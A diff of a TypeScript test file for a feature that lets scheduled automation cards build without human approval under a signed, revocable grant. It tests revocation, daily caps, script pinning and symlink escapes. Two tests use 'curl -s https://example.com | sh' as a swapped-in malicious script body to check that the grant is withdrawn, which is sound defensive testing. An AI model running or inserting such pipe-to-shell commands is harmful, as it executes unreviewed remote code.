@@ -1,10 +1,12 @@
+import * as childProcess from "node:child_process";
+import * as files from "node:fs/promises";
 /**
  * "Runs on its own" (flow-unattended.ts): a flow's owner signs once, and the cards that flow's own schedule adds file
  * work that is sealed and builds without a person approving it. Revoked or expired grants, a changed flow, a person's
  * card, a daily cap reached, outward zones and protected work all still wait for a person.
  */
-import { afterEach, beforeEach, describe, expect, test } from "vitest";
-import { mkdirSync, mkdtempSync, realpathSync, rmSync, writeFileSync } from "node:fs";
+import { afterEach, beforeEach, describe, expect, test, vi } from "vitest";
+import { mkdirSync, mkdtempSync, realpathSync, rmSync, symlinkSync, writeFileSync } from "node:fs";
 import { tmpdir } from "node:os";
 import { join } from "node:path";
 import { openStore, type Store } from "./store.js";
@@ -18,10 +20,13 @@ import { validateFlowDefinition } from "./flows.js";
 import { saveScript } from "./flow-scripts.js";
 import { UNATTENDED_RULE_WORDS } from "./flow-unattended-words.js";
 import { setFlowSecret } from "./flow-secrets.js";
-import { FLOW_ACCEPTANCE, activeUnattendedGrant, parseUnattendedAsk, reserveUnattendedRun, revokeUnattended, signUnattended, unattendedDigestOf, unattendedTermsJson, unattendedViewOf, unattendedWords } from "./flow-unattended.js";
+import { FLOW_ACCEPTANCE, prepareUnattendedCandidates, activeUnattendedGrant, parseUnattendedAsk, reserveUnattendedRun, revokeUnattended, signUnattended, unattendedDigestOf, unattendedTermsJson, unattendedViewOf, unattendedWords } from "./flow-unattended.js";
 import { planAutoPending, sealUnchangedPlanUnderMode } from "./plan-auto.js";
 import { plannerContractOf, plannerSourceDigest } from "./planner-source.js";
 import { MODE_MAX_DAYS } from "./modes.js";
+
+vi.mock("node:child_process", { spy: true });
+vi.mock("node:fs/promises", { spy: true });
 
 let dir: string, repo: string, store: Store;
 const T0 = new Date("2026-10-12T08:00:00Z");
@@ -38,7 +43,7 @@ beforeEach(() => {
   if (!alex.ok || !addApprover(store, "sam", T0, { name: "alex", token: alex.token }).ok) throw Error("account");
   for (const phase of ["plan", "build", "review"]) store.setPhaseConfig("installation", phase, "claude", "sonnet", "test", T0);
 });
-afterEach(() => { store.close(); rmSync(dir, { recursive: true, force: true }); });
+afterEach(() => { vi.restoreAllMocks(); store.close(); rmSync(dir, { recursive: true, force: true }); });
 
 /** A Weekly upkeep-shaped flow owned by alex: a schedule starts each card in a build, then a person decides. */
 function scheduledFlow(options: { planning?: "skip" | "required"; start?: string } = {}): { flow: number; trigger: number } {
@@ -69,14 +74,14 @@ const sign = (flow: number, ask: Partial<{ days: number; budgetMicrousd: number 
   signUnattended(store, { flow, signer, ask: { days: 2, budgetMicrousd: null, dailyRunCap: null, ...ask } }, now);
 
 describe("signing", () => {
-  test("only the flow's owner signs, for 1 to MODE_MAX_DAYS days, and it is in the ledger", () => {
+  test("only the flow's owner signs, for 1 to MODE_MAX_DAYS days, and it is in the ledger", async () => {
     const { flow } = scheduledFlow();
-    expect(sign(flow, {}, "sam")).toEqual({ ok: false, message: "Only alex, who owns this flow, can let it run on its own." });
+    expect(await sign(flow, {}, "sam")).toEqual({ ok: false, message: "Only alex, who owns this flow, can let it run on its own." });
     expect(parseUnattendedAsk({ days: "0" })).toMatchObject({ ok: false });
     expect(parseUnattendedAsk({ days: String(MODE_MAX_DAYS + 1) })).toMatchObject({ ok: false, message: `Choose 1 to ${MODE_MAX_DAYS} days: it always ends.` });
     expect(parseUnattendedAsk({ days: "7", budget: "$2.50", runs: "3" })).toEqual({ ok: true, ask: { days: 7, budgetMicrousd: 2_500_000, dailyRunCap: 3 } });
     expect(parseUnattendedAsk({ days: "1", runs: "0" })).toMatchObject({ ok: false });
-    const signed = sign(flow, { days: 3, budgetMicrousd: 5_000_000, dailyRunCap: 2 });
+    const signed = await sign(flow, { days: 3, budgetMicrousd: 5_000_000, dailyRunCap: 2 });
     if (!signed.ok) throw Error(signed.message);
     expect(signed.grant.absoluteExpiry).toBe(at(3 * DAY).toISOString());
     expect(signed.grant.terms).toMatchObject({ owner: "alex", permissions: "safe", acceptance: FLOW_ACCEPTANCE, perAttemptBudgetMicrousd: 5_000_000, dailyRunCap: 2 });
@@ -84,14 +89,14 @@ describe("signing", () => {
     expect(store.actionLedger({ repos: [repo] })).toEqual(expect.arrayContaining([expect.objectContaining({ action: "flow runs on its own: signed", actor: "alex", outcome: "signed" })]));
   });
 
-  test("a flow with no schedule, a protected project and protected paths are refused", () => {
+  test("a flow with no schedule, a protected project and protected paths are refused", async () => {
     const plain = store.createFlow({ repo, name: "Coding", by: "alex", definitionJson: JSON.stringify(validateFlowDefinition({ version: 1, start: "build", stages: [{ id: "build", title: "Build", kind: "task", instructions: "{{card.title}}" }] })) }, T0);
-    expect(sign(plain)).toEqual({ ok: false, message: "This flow has no schedule, so nothing would run on its own." });
+    expect(await sign(plain)).toEqual({ ok: false, message: "This flow has no schedule, so nothing would run on its own." });
     const { flow } = scheduledFlow();
     store.setApprovalRules(repo, { notRequester: false, protectProject: true, protectedPaths: [] }, "alex", T0);
-    expect(sign(flow)).toMatchObject({ ok: false, message: "This project is protected: a person approves its work." });
+    expect(await sign(flow)).toMatchObject({ ok: false, message: "This project is protected: a person approves its work." });
     store.setApprovalRules(repo, { notRequester: false, protectProject: false, protectedPaths: [".github/workflows"] }, "alex", T0);
-    expect(sign(flow)).toMatchObject({ ok: false, message: expect.stringContaining("protects some paths") });
+    expect(await sign(flow)).toMatchObject({ ok: false, message: expect.stringContaining("protects some paths") });
     expect(unattendedViewOf(store, store.getFlow(flow)!, { name: "alex", approver: true }, T0)).toMatchObject({ active: null, canSign: false, scheduled: true });
   });
 });
@@ -99,7 +104,7 @@ describe("signing", () => {
 describe("a scheduled card", () => {
   test("on a flow signed to run on its own is sealed with the grant's terms and builds without a person", async () => {
     const { flow, trigger } = scheduledFlow();
-    const signed = sign(flow, { budgetMicrousd: 4_000_000 });
+    const signed = await sign(flow, { budgetMicrousd: 4_000_000 });
     if (!signed.ok) throw Error(signed.message);
     const { card, task } = await fire(trigger, at(HOUR));
     expect(task).not.toBeNull();
@@ -119,7 +124,7 @@ describe("a scheduled card", () => {
 
   test("a build that plans is pre-authorized, and only its unchanged plan approves itself", async () => {
     const { flow, trigger } = scheduledFlow({ planning: "required" });
-    const signed = sign(flow);
+    const signed = await sign(flow);
     if (!signed.ok) throw Error(signed.message);
     const { task } = await fire(trigger, at(HOUR));
     expect(store.lookupRef(task!)!.plan).toBe("requested");
@@ -139,7 +144,7 @@ describe("a scheduled card", () => {
 
   test("a revoked grant falls back to Needs you, for the queued work it sealed and for the next card", async () => {
     const { flow, trigger } = scheduledFlow();
-    sign(flow);
+    await sign(flow);
     const first = await fire(trigger, at(HOUR));
     expect(store.scopeSealed(first.task!)).toBe(true);
     expect(revokeUnattended(store, flow, "sam", at(2 * HOUR))).toBe(true);
@@ -154,7 +159,7 @@ describe("a scheduled card", () => {
 
   test("an expired grant stops dispatching at once and the next card waits", async () => {
     const { flow, trigger } = scheduledFlow();
-    sign(flow, { days: 1 });
+    await sign(flow, { days: 1 });
     const first = await fire(trigger, at(HOUR));
     const ref = store.lookupRef(first.task!)!.id;
     // By the clock alone, before anything closes the row, the belt refuses.
@@ -168,7 +173,7 @@ describe("a scheduled card", () => {
 
   test("editing the flow ends what the grant covers", async () => {
     const { flow, trigger } = scheduledFlow();
-    sign(flow);
+    await sign(flow);
     const current = store.getFlow(flow)!;
     expect(store.saveFlow(flow, { name: current.name, definitionJson: current.definitionJson, sawRevision: current.revision, by: "alex" }, at(HOUR))).toBe(true);
     const next = await fire(trigger, at(2 * HOUR));
@@ -178,7 +183,7 @@ describe("a scheduled card", () => {
 
   test("the daily run cap admits that many a UTC day, then cards wait", async () => {
     const { flow, trigger } = scheduledFlow();
-    sign(flow, { dailyRunCap: 1 });
+    await sign(flow, { dailyRunCap: 1 });
     expect(store.scopeSealed((await fire(trigger, at(HOUR))).task!)).toBe(true);
     expect(store.scopeSealed((await fire(trigger, at(2 * HOUR))).task!)).toBe(false);
     expect(store.scopeSealed((await fire(trigger, at(DAY))).task!)).toBe(true);
@@ -186,9 +191,9 @@ describe("a scheduled card", () => {
 });
 
 describe("still a person's", () => {
-  test("a card a person adds to a granted flow waits for approval", () => {
+  test("a card a person adds to a granted flow waits for approval", async () => {
     const { flow } = scheduledFlow();
-    sign(flow);
+    await sign(flow);
     const added = addCardToFlow(store, store.getFlow(flow)!, { title: "Bump the linter", description: null, stage: "update" }, "alex", at(HOUR));
     if (!added.ok) throw Error(added.message);
     advanceFlows(store, repo, at(HOUR));
@@ -198,7 +203,7 @@ describe("still a person's", () => {
 
   test("a Person decides zone still waits for its person", async () => {
     const { flow, trigger } = scheduledFlow({ start: "review" });
-    sign(flow);
+    await sign(flow);
     const { card } = await fire(trigger, at(HOUR));
     expect(store.getFlowCard(card)).toMatchObject({ stage: "review", task: null, waiting: "Waiting for an approver to approve or send it back" });
     expect(store.actionLedger({ repos: [repo] }).some(one => one.action === "flow decision")).toBe(false);
@@ -206,7 +211,7 @@ describe("still a person's", () => {
 
   test("protecting the project after signing refuses the next card", async () => {
     const { flow, trigger } = scheduledFlow();
-    sign(flow);
+    await sign(flow);
     store.setApprovalRules(repo, { notRequester: false, protectProject: true, protectedPaths: [] }, "sam", at(HOUR));
     const next = await fire(trigger, at(2 * HOUR));
     expect(store.scopeSealed(next.task!)).toBe(false);
@@ -221,7 +226,7 @@ const ended = (reason: string) => store.actionLedger({ repos: [repo] }).filter(o
 describe("the grant covers only the schedules it signed", () => {
   test("another approver adding a schedule after signing ends the grant, and its card waits (P1)", async () => {
     const { flow, trigger } = scheduledFlow();
-    const signed = sign(flow);
+    const signed = await sign(flow);
     if (!signed.ok) throw Error(signed.message);
     expect(signed.grant.terms.triggers).toEqual([expect.objectContaining({ id: trigger, kind: "schedule", words: "“Weekly upkeep”, daily at 09:00" })]);
     const queued = await fire(trigger, at(HOUR));
@@ -238,27 +243,27 @@ describe("the grant covers only the schedules it signed", () => {
 
   test("a covered schedule's settings changed underneath the grant are not covered", async () => {
     const { flow, trigger } = scheduledFlow();
-    sign(flow);
+    await sign(flow);
     store.handle.prepare("UPDATE flow_trigger SET config_json = ? WHERE id = ?").run(JSON.stringify({ kind: "schedule", schedule: "daily:09:00", title: "Force-push main", description: null, zone: null }), trigger);
     expect(sealed((await fire(trigger, at(HOUR))).task)).toBe(false);
   });
 
-  test("pausing, resuming or removing a schedule ends the grant", () => {
+  test("pausing, resuming or removing a schedule ends the grant", async () => {
     const { flow, trigger } = scheduledFlow();
     const spare = addFlowTriggerTo(store, store.getFlow(flow)!, { kind: "schedule", schedule: "daily 10:00", title: "Lint pass", description: null }, "alex", T0, null);
     if (!spare.ok) throw Error(spare.message);
-    const change = (fn: () => void) => {
-      expect(sign(flow, {}, "alex", at(HOUR)).ok).toBe(true);
+    const change = async (fn: () => void) => {
+      expect((await sign(flow, {}, "alex", at(HOUR))).ok).toBe(true);
       fn();
       expect(activeUnattendedGrant(store, flow, at(2 * HOUR))).toBeNull();
     };
-    change(() => setFlowTriggerOn(store, store.getFlowTrigger(trigger)!, false, at(2 * HOUR), "sam"));
-    change(() => setFlowTriggerOn(store, store.getFlowTrigger(trigger)!, true, at(2 * HOUR), "sam"));
-    change(() => removeFlowTrigger(store, store.getFlowTrigger(trigger)!, at(2 * HOUR), null, "sam"));
+    await change(() => setFlowTriggerOn(store, store.getFlowTrigger(trigger)!, false, at(2 * HOUR), "sam"));
+    await change(() => setFlowTriggerOn(store, store.getFlowTrigger(trigger)!, true, at(2 * HOUR), "sam"));
+    await change(() => removeFlowTrigger(store, store.getFlowTrigger(trigger)!, at(2 * HOUR), null, "sam"));
     expect(ended("schedule changed")).toHaveLength(3);
   });
 
-  test("a script's or a plane review's schedule is covered only when the owner picks it", () => {
+  test("a script's or a plane review's schedule is covered only when the owner picks it", async () => {
     store.saveFlowScript({ repo, name: "issues", about: "Open issues", body: "echo '[]'", timeoutMinutes: 1, digest: "test", by: "alex" }, T0);
     const flow = store.createFlow({ repo, name: "Triage", by: "alex", definitionJson: JSON.stringify(validateFlowDefinition({ version: 1, start: "fix", stages: [
       { id: "fix", title: "Fix it", kind: "task", instructions: "{{card.title}}", planning: "skip" }] })) }, T0);
@@ -269,26 +274,26 @@ describe("the grant covers only the schedules it signed", () => {
       { id: script.id, words: "the issues script, daily at 09:00", optional: expect.stringContaining("outside text") },
       { id: plane.id, words: "Plane review, daily at 07:30", optional: expect.stringContaining("what the plane saw") },
     ]);
-    expect(sign(flow)).toEqual({ ok: false, message: expect.stringContaining("Choose a schedule to include") });
-    expect(sign(flow, { include: [999] })).toEqual({ ok: false, message: "Trigger 999 isn't one of this flow's active schedules." });
-    const signed = sign(flow, { include: [script.id] });
+    expect(await sign(flow)).toEqual({ ok: false, message: expect.stringContaining("Choose a schedule to include") });
+    expect(await sign(flow, { include: [999] })).toEqual({ ok: false, message: "Trigger 999 isn't one of this flow's active schedules." });
+    const signed = await sign(flow, { include: [script.id] });
     if (!signed.ok) throw Error(signed.message);
     expect(signed.grant.terms.triggers.map(one => one.id)).toEqual([script.id]);
     expect(parseUnattendedAsk({ days: "1", include: "4, 7" })).toEqual({ ok: true, ask: { days: 1, budgetMicrousd: null, dailyRunCap: null, include: [4, 7] } });
   });
 
-  test("a schedule that changed while the owner read the terms is refused", () => {
+  test("a schedule that changed while the owner read the terms is refused", async () => {
     const { flow } = scheduledFlow();
     const shown = unattendedViewOf(store, store.getFlow(flow)!, { name: "alex", approver: true }, T0).schedulesDigest;
     addFlowTriggerTo(store, store.getFlow(flow)!, { kind: "schedule", schedule: "every 1 hour", title: "More", description: null }, "sam", T0, null);
-    expect(signUnattended(store, { flow, signer: "alex", ask: { days: 1, budgetMicrousd: null, dailyRunCap: null }, sawSchedules: shown }, T0)).toEqual({ ok: false, message: expect.stringContaining("schedules changed") });
+    expect(await signUnattended(store, { flow, signer: "alex", ask: { days: 1, budgetMicrousd: null, dailyRunCap: null }, sawSchedules: shown }, T0)).toEqual({ ok: false, message: expect.stringContaining("schedules changed") });
   });
 });
 
 describe("only the clock's own firings, after signing, untouched by a person", () => {
-  test("a person's Run now is not sealed (P2)", () => {
+  test("a person's Run now is not sealed (P2)", async () => {
     const { flow, trigger } = scheduledFlow();
-    sign(flow);
+    await sign(flow);
     const ran = runScheduleNow(store, store.getFlowTrigger(trigger)!, "sam", at(HOUR));
     if (!ran.ok) throw Error(ran.said);
     advanceFlows(store, repo, at(HOUR));
@@ -302,14 +307,14 @@ describe("only the clock's own firings, after signing, untouched by a person", (
     store.updateFlowTrigger(trigger, { nextAt: T0.toISOString() }, T0);
     await runFlowTriggers(store, repo, at(HOUR), io);
     const card = store.lastFlowTriggerCard(trigger)!;
-    sign(flow, {}, "alex", at(2 * HOUR));
+    await sign(flow, {}, "alex", at(2 * HOUR));
     advanceFlows(store, repo, at(2 * HOUR));
     expect(sealed(store.getFlowCard(card)!.task)).toBe(false);
   });
 
   test("a card a person moves back into its build zone waits", async () => {
     const { flow, trigger } = scheduledFlow();
-    sign(flow);
+    await sign(flow);
     const first = await fire(trigger, at(HOUR));
     expect(sealed(first.task)).toBe(true);
     for (const to of ["review", "update"]) {
@@ -327,7 +332,7 @@ describe("only the clock's own firings, after signing, untouched by a person", (
 describe("authority re-proved after sealing", () => {
   test("protecting the project withdraws queued sealed work and ends the grant; the belt refuses a raced rule (P3)", async () => {
     const { flow, trigger } = scheduledFlow();
-    sign(flow);
+    await sign(flow);
     const queued = await fire(trigger, at(HOUR));
     expect(dispatchable(queued.task!, at(HOUR))).toBe(true);
     // A rule written beside the ceremony (a race, or an older writer): dispatch refuses on its own.
@@ -344,7 +349,7 @@ describe("authority re-proved after sealing", () => {
 
   test("the belt refuses once the owner can't reach the project, and an access change ends the grant (P4)", async () => {
     const { flow, trigger } = scheduledFlow();
-    sign(flow);
+    await sign(flow);
     const queued = await fire(trigger, at(HOUR));
     const elsewhere = join(dir, "elsewhere");
     mkdirSync(elsewhere);
@@ -360,11 +365,11 @@ describe("authority re-proved after sealing", () => {
 
   test("renewing withdraws what the old grant sealed and pre-authorized", async () => {
     const { flow, trigger } = scheduledFlow({ planning: "required" });
-    const old = sign(flow);
+    const old = await sign(flow);
     if (!old.ok) throw Error(old.message);
     const { task } = await fire(trigger, at(HOUR));
     expect(planAutoPending(store, task!, at(HOUR))).toBe(true);
-    const renewed = sign(flow, { days: 3 }, "alex", at(2 * HOUR));
+    const renewed = await sign(flow, { days: 3 }, "alex", at(2 * HOUR));
     if (!renewed.ok) throw Error(renewed.message);
     expect(renewed.grant.digest).not.toBe(old.grant.digest);
     expect(planAutoPending(store, task!, at(2 * HOUR))).toBe(false);
@@ -372,9 +377,9 @@ describe("authority re-proved after sealing", () => {
     expect(store.actionLedger({ repos: [repo] })).toEqual(expect.arrayContaining([expect.objectContaining({ action: "flow runs on its own: renewed", actor: "alex" })]));
   });
 
-  test("the daily cap is one statement: two connections racing for the last run, one wins", () => {
+  test("the daily cap is one statement: two connections racing for the last run, one wins", async () => {
     const { flow } = scheduledFlow();
-    const signed = sign(flow, { dailyRunCap: 1 });
+    const signed = await sign(flow, { dailyRunCap: 1 });
     if (!signed.ok) throw Error(signed.message);
     const other = openStore(join(dir, "orders.db"));
     try {
@@ -387,7 +392,7 @@ describe("authority re-proved after sealing", () => {
     const { flow, trigger } = scheduledFlow();
     const second = addFlowTriggerTo(store, store.getFlow(flow)!, { kind: "schedule", schedule: "daily 10:00", title: "Lint pass", description: null }, "alex", T0, null);
     if (!second.ok) throw Error(second.message);
-    sign(flow, { dailyRunCap: 1 });
+    await sign(flow, { dailyRunCap: 1 });
     for (const one of [trigger, second.id]) store.updateFlowTrigger(one, { nextAt: T0.toISOString() }, T0);
     await runFlowTriggers(store, repo, at(HOUR), io);
     advanceFlows(store, repo, at(HOUR));
@@ -423,16 +428,16 @@ describe("a script schedule is pinned by its code, not its name", () => {
 
   test("an unchanged script still seals its card, and the signature carries its code", async () => {
     const { flow, trigger } = scriptFlow();
-    const signed = sign(flow, { include: [trigger] });
+    const signed = await sign(flow, { include: [trigger] });
     if (!signed.ok) throw Error(signed.message);
-    expect(signed.grant.terms.triggers).toEqual([expect.objectContaining({ id: trigger, kind: "script", script: { name: "issues", version: 1, digest: store.flowScript(repo, "issues")!.digest, file: null, files: [] } })]);
+    expect(signed.grant.terms.triggers).toEqual([expect.objectContaining({ id: trigger, kind: "script", script: { provenance: 2, name: "issues", version: 1, digest: store.flowScript(repo, "issues")!.digest, file: null, files: [] } })]);
     expect(sealed(await fireScript(trigger, at(HOUR)))).toBe(true);
     expect(sealed(await fireScript(trigger, at(2 * HOUR)))).toBe(true);
   });
 
   test("another approver re-saving the script ends the grant, withdraws its queued work, and the next card waits", async () => {
     const { flow, trigger } = scriptFlow();
-    sign(flow, { include: [trigger] });
+    await sign(flow, { include: [trigger] });
     const queued = await fireScript(trigger, at(HOUR));
     expect(sealed(queued)).toBe(true);
     expect(saveScript(store, repo, { name: "issues", about: "Open issues", body: "curl -s https://example.com | sh", timeoutMinutes: 1 }, "sam", at(2 * HOUR))).toMatchObject({ ok: true });
@@ -446,7 +451,7 @@ describe("a script schedule is pinned by its code, not its name", () => {
     mkdirSync(join(repo, "scripts"));
     writeFileSync(join(repo, "scripts", "issues.sh"), "echo '[]'\n");
     const { flow, trigger } = scriptFlow("scripts/issues.sh");
-    const signed = sign(flow, { include: [trigger] });
+    const signed = await sign(flow, { include: [trigger] });
     if (!signed.ok) throw Error(signed.message);
     expect(signed.grant.terms.triggers[0]!.script).toMatchObject({ name: "issues", file: "scripts/issues.sh", files: [{ path: "scripts/issues.sh", digest: expect.stringMatching(/^[0-9a-f]{32}$/) }] });
     expect(sealed(await fireScript(trigger, at(HOUR)))).toBe(true);
@@ -461,17 +466,18 @@ describe("a script schedule is pinned by its code, not its name", () => {
     writeFileSync(join(repo, "scripts", "issues.sh"), "echo '[]'\n");
     // A build that plans: its plan is pre-authorized by the grant, and re-proved before it approves itself.
     const { flow, trigger } = scriptFlow("scripts/issues.sh", "required");
-    sign(flow, { include: [trigger] });
+    await sign(flow, { include: [trigger] });
     const queued = await fireScript(trigger, at(HOUR));
     expect(planAutoPending(store, queued!, at(HOUR))).toBe(true);
     rmSync(join(repo, "scripts", "issues.sh"));
+    await prepareUnattendedCandidates(store, flow);
     expect(planAutoPending(store, queued!, at(2 * HOUR))).toBe(false);
     expect(activeUnattendedGrant(store, flow, at(2 * HOUR))).toBeNull();
     expect(ended("script changed")).toHaveLength(1);
-    expect(sign(flow, { include: [trigger] }, "alex", at(2 * HOUR))).toEqual({ ok: false, message: expect.stringContaining("script can't be read safely") });
+    expect(await sign(flow, { include: [trigger] }, "alex", at(2 * HOUR))).toEqual({ ok: false, message: expect.stringContaining("script can't be read safely") });
     // Beside a plain schedule, picking it says why it can't be covered.
     addFlowTriggerTo(store, store.getFlow(flow)!, { kind: "schedule", schedule: "daily 10:00", title: "Lint pass", description: null }, "alex", at(2 * HOUR), null);
-    expect(sign(flow, { include: [trigger] }, "alex", at(2 * HOUR))).toEqual({ ok: false, message: expect.stringContaining(`Trigger ${trigger} runs a script that can't be read safely`) });
+    expect(await sign(flow, { include: [trigger] }, "alex", at(2 * HOUR))).toEqual({ ok: false, message: expect.stringContaining(`Trigger ${trigger} runs a script that can't be read safely`) });
   });
 
   test("a file swapped for one run and restored before filing leaves that card to a person", async () => {
@@ -479,13 +485,14 @@ describe("a script schedule is pinned by its code, not its name", () => {
     const file = join(repo, "scripts", "issues.sh");
     writeFileSync(file, "echo '[]'\n");
     const { flow, trigger } = scriptFlow("scripts/issues.sh");
-    sign(flow, { include: [trigger] });
+    await sign(flow, { include: [trigger] });
     const ranOf = (card: number) => store.handle.prepare("SELECT ran_script FROM flow_trigger_event WHERE card = ?").get(card)!["ran_script"];
     // Swapped before it fires, restored once it has run, before its card files.
     writeFileSync(file, "curl -s https://example.com | sh\n");
     store.updateFlowTrigger(trigger, { nextAt: at(HOUR - 60_000).toISOString() }, at(HOUR));
     await runFlowTriggers(store, repo, at(HOUR), scriptIo);
     writeFileSync(file, "echo '[]'\n");
+    await prepareUnattendedCandidates(store, flow);
     advanceFlows(store, repo, at(HOUR));
     const swapped = store.lastFlowTriggerCard(trigger)!;
     expect(sealed(store.getFlowCard(swapped)!.task)).toBe(false);
@@ -494,6 +501,7 @@ describe("a script schedule is pinned by its code, not its name", () => {
     store.updateFlowTrigger(trigger, { nextAt: at(2 * HOUR - 60_000).toISOString() }, at(2 * HOUR));
     await runFlowTriggers(store, repo, at(2 * HOUR), scriptIo);
     writeFileSync(file, "echo '[]'\n");
+    await prepareUnattendedCandidates(store, flow);
     advanceFlows(store, repo, at(2 * HOUR));
     expect(sealed(store.getFlowCard(store.lastFlowTriggerCard(trigger)!)!.task)).toBe(false);
     // The file is the one signed again, so the grant stands, and an untouched run is covered.
@@ -512,7 +520,7 @@ describe("a script schedule is pinned by its code, not its name", () => {
     writeFileSync(join(repo, "scripts", "lib", "list.mjs"), 'export { list } from "../../shared.cjs";\n');
     writeFileSync(join(repo, "shared.cjs"), "exports.list = () => [];\n");
     const { flow, trigger } = scriptFlow("scripts/issues.mjs", "skip", "node");
-    const signed = sign(flow, { include: [trigger] });
+    const signed = await sign(flow, { include: [trigger] });
     if (!signed.ok) throw Error(signed.message);
     expect(signed.grant.terms.triggers[0]!.script!.files.map(one => one.path)).toEqual(["scripts/issues.mjs", "scripts/lib/list.mjs", "shared.cjs"]);
     expect(sealed(await fireScript(trigger, at(HOUR)))).toBe(true);
@@ -522,16 +530,71 @@ describe("a script schedule is pinned by its code, not its name", () => {
     expect(ended("script changed")).toHaveLength(1);
   });
 
-  test("a Node script with a static import that doesn't resolve can't be signed", () => {
+  test("a Node script with a static import that doesn't resolve can't be signed", async () => {
     mkdirSync(join(repo, "scripts"));
     writeFileSync(join(repo, "scripts", "issues.mjs"), 'import "./missing.mjs";\nconsole.log("[]");\n');
     const { flow, trigger } = scriptFlow("scripts/issues.mjs", "skip", "node");
-    expect(sign(flow, { include: [trigger] })).toEqual({ ok: false, message: expect.stringContaining("script can't be read safely") });
+    expect(await sign(flow, { include: [trigger] })).toEqual({ ok: false, message: expect.stringContaining("script can't be read safely") });
+  });
+
+  test("symlinked entries and project imports escaping through symlinks cannot be signed", async () => {
+    writeFileSync(join(dir, "outside.mjs"), "export default [];\n");
+    symlinkSync(join(dir, "outside.mjs"), join(repo, "entry.mjs"));
+    const { flow, trigger } = scriptFlow("entry.mjs", "skip", "node");
+    expect(await sign(flow, { include: [trigger] })).toMatchObject({ ok: false, message: expect.stringContaining("can't be read safely") });
+    rmSync(join(repo, "entry.mjs"));
+    writeFileSync(join(repo, "entry.mjs"), 'import "./linked.mjs";');
+    symlinkSync(join(dir, "outside.mjs"), join(repo, "linked.mjs"));
+    expect(await sign(flow, { include: [trigger] })).toMatchObject({ ok: false, message: expect.stringContaining("can't be read safely") });
+    // An entry symlink to a file inside the project is also refused.
+    rmSync(join(repo, "entry.mjs"));
+    writeFileSync(join(repo, "real.mjs"), "console.log('[]');");
+    symlinkSync(join(repo, "real.mjs"), join(repo, "entry.mjs"));
+    expect(await sign(flow, { include: [trigger] })).toMatchObject({ ok: false });
+  });
+
+  test("literal createRequire dependencies are pinned and unresolved ones fail closed", async () => {
+    writeFileSync(join(repo, "entry.mjs"), 'import { createRequire } from "node:module"; createRequire(import.meta.url)("./data.cjs");');
+    writeFileSync(join(repo, "data.cjs"), "module.exports = [];");
+    const { flow, trigger } = scriptFlow("entry.mjs", "skip", "node");
+    const signed = await sign(flow, { include: [trigger] });
+    expect(signed.ok && signed.grant.terms.triggers[0]!.script!.files.map(one => one.path)).toEqual(["data.cjs", "entry.mjs"]);
+    writeFileSync(join(repo, "data.cjs"), "module.exports = ['changed'];");
+    expect(sealed(await fireScript(trigger, at(HOUR)))).toBe(false);
+    rmSync(join(repo, "data.cjs"));
+    expect(await sign(flow, { include: [trigger] })).toMatchObject({ ok: false });
+  });
+
+  test("signing resolves outside transactions and filing and rendering only read saved provenance", async () => {
+    writeFileSync(join(repo, "entry.mjs"), 'import "./data.mjs";');
+    writeFileSync(join(repo, "data.mjs"), "export default [];");
+    const { flow, trigger } = scriptFlow("entry.mjs", "skip", "node");
+    let transacting = false;
+    const transact = store.transact.bind(store);
+    vi.spyOn(store, "transact").mockImplementation(body => transact(() => { transacting = true; try { return body(); } finally { transacting = false; } }));
+    const { spawn } = await vi.importActual<typeof childProcess>("node:child_process");
+    const spawned = vi.spyOn(childProcess, "spawn").mockImplementation((...args: Parameters<typeof spawn>) => { expect(transacting).toBe(false); return spawn(...args); });
+    expect((await sign(flow, { include: [trigger] })).ok).toBe(true);
+    expect(spawned).toHaveBeenCalled();
+    spawned.mockClear();
+    await prepareUnattendedCandidates(store, flow);
+    expect(spawned).not.toHaveBeenCalled();
+    store.updateFlowTrigger(trigger, { nextAt: at(HOUR - 60_000).toISOString() }, at(HOUR));
+    await runFlowTriggers(store, repo, at(HOUR), scriptIo);
+    spawned.mockClear();
+    const reads = vi.spyOn(files, "readFile").mockClear();
+    const paths = vi.spyOn(files, "realpath").mockClear();
+    advanceFlows(store, repo, at(HOUR));
+    unattendedViewOf(store, store.getFlow(flow)!, { name: "alex", approver: true }, at(HOUR));
+    expect(spawned).not.toHaveBeenCalled();
+    expect(reads).not.toHaveBeenCalled();
+    expect(paths).not.toHaveBeenCalled();
+    expect(sealed(store.getFlowCard(store.lastFlowTriggerCard(trigger)!)!.task)).toBe(true);
   });
 
   test("adding a secret name to the script's schedule ends its coverage", async () => {
     const { flow, trigger } = scriptFlow();
-    sign(flow, { include: [trigger] });
+    await sign(flow, { include: [trigger] });
     expect(sealed(await fireScript(trigger, at(HOUR)))).toBe(true);
     expect(setFlowSecret(dir, repo, "GITHUB_TOKEN", "ghp_example").ok).toBe(true);
     const config = JSON.parse(store.getFlowTrigger(trigger)!.configJson) as Record<string, unknown>;
@@ -539,11 +602,22 @@ describe("a script schedule is pinned by its code, not its name", () => {
     expect(sealed(await fireScript(trigger, at(2 * HOUR)))).toBe(false);
   });
 
-  test("a grant signed before imports were pinned covers nothing", () => {
+  test("the previous script record shape becomes inactive at upgrade", async () => {
+    const { flow, trigger } = scriptFlow();
+    const signed = await sign(flow, { include: [trigger] });
+    if (!signed.ok) throw Error(signed.message);
+    const terms = JSON.parse(unattendedTermsJson(signed.grant.terms));
+    delete terms.triggers[0].script.provenance;
+    store.handle.prepare("UPDATE flow_unattended_grant SET terms_json = ?, digest = ? WHERE id = ?")
+      .run(JSON.stringify(terms), unattendedDigestOf(terms), signed.grant.id);
+    expect(activeUnattendedGrant(store, flow, T0)).toBeNull();
+  });
+
+  test("a grant signed before imports were pinned covers nothing", async () => {
     mkdirSync(join(repo, "scripts"));
     writeFileSync(join(repo, "scripts", "issues.sh"), "echo '[]'\n");
     const { flow, trigger } = scriptFlow("scripts/issues.sh");
-    const signed = sign(flow, { include: [trigger] });
+    const signed = await sign(flow, { include: [trigger] });
     if (!signed.ok) throw Error(signed.message);
     const { files, file, ...script } = signed.grant.terms.triggers[0]!.script!;
     const terms = { ...signed.grant.terms, triggers: [{ ...signed.grant.terms.triggers[0]!, script: { ...script, file: { path: file, digest: files[0]!.digest } } }] } as unknown as typeof signed.grant.terms;
@@ -551,9 +625,9 @@ describe("a script schedule is pinned by its code, not its name", () => {
     expect(activeUnattendedGrant(store, flow, at(HOUR))).toBeNull();
   });
 
-  test("a grant signed without its script's code covers nothing", () => {
+  test("a grant signed without its script's code covers nothing", async () => {
     const { flow, trigger } = scriptFlow();
-    const signed = sign(flow, { include: [trigger] });
+    const signed = await sign(flow, { include: [trigger] });
     if (!signed.ok) throw Error(signed.message);
